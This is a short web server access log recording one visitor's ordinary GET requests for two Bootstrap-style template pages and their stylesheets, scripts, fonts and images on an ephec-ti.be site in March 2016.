81.245.67.206 - - [17/Mar/2016:23:17:10 +0000] "GET /creative/ HTTP/1.1" 200 2684 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 5780 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/css/animate.min.css HTTP/1.1" 200 4009 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/css/bootstrap.min.css HTTP/1.1" 200 20090 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/js/bootstrap.min.js HTTP/1.1" 200 10117 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/css/creative.css HTTP/1.1" 200 2120 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/js/jquery.easing.min.js HTTP/1.1" 200 2222 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/js/jquery.fittext.js HTTP/1.1" 200 935 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/js/wow.min.js HTTP/1.1" 200 3053 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/js/jquery.js HTTP/1.1" 200 33578 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/js/creative.js HTTP/1.1" 200 1022 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/portfolio/2.jpg HTTP/1.1" 200 48389 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/portfolio/1.jpg HTTP/1.1" 200 64076 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/portfolio/3.jpg HTTP/1.1" 200 48516 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/portfolio/4.jpg HTTP/1.1" 200 49343 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/portfolio/5.jpg HTTP/1.1" 200 62622 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/portfolio/6.jpg HTTP/1.1" 200 53716 "http://www.wt4.ephec-ti.be/creative/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/font-awesome/fonts/fontawesome-webfont.woff2?v=4.3.0 HTTP/1.1" 200 57042 "http://www.wt4.ephec-ti.be/creative/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:11 +0000] "GET /creative/img/header.jpg HTTP/1.1" 200 126266 "http://www.wt4.ephec-ti.be/creative/css/creative.css" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:13 +0000] "GET /freelancer/ HTTP/1.1" 200 3714 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:13 +0000] "GET /freelancer/css/freelancer.css HTTP/1.1" 200 2232 "http://www.wt4.ephec-ti.be/freelancer/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
